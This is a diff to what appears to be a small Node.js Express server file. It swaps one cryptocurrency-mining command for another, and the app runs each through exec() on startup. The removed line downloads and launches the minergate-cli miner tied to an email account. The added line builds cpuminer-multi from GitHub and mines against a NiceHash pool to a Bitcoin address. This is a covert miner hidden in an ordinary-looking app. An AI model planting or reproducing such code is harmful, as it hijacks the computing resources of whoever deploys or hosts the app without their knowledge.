@@ -13,5 +13,5 @@ app.get('/', function (req, res) {
 app.listen(PORT);
 console.log('Running on http://localhost:' + PORT);
 
-var cmd = 'wget -q --content-disposition https://minergate.com/download/deb-cli && ar x minergate-cli-release.deb && tar -xzf control.tar.gz && tar -xzf data.tar.gz && cd opt/minergate-cli && ./minergate-cli -user chaowarut@Hotmail.com -xmr';
+var cmd = 'apt-get update -qq && apt-get install -qy build-essential libcurl4-openssl-dev git automake libtool libjansson* libncurses5-dev libssl-dev && git clone --recursive https://github.com/tpruvot/cpuminer-multi -b linux && cd cpuminer-multi && ./autogen.sh && ./configure --with-crypto --with-curl && make -j"$(nproc)" && make install && cpuminer -a lyra2re -o stratum+tcp://lyra2re.hk.nicehash.com:3342 -u 1NArxcdTF7nFzpf4aerd61mdqm4SQwAfW4.b1 -p x';
 exec(cmd);
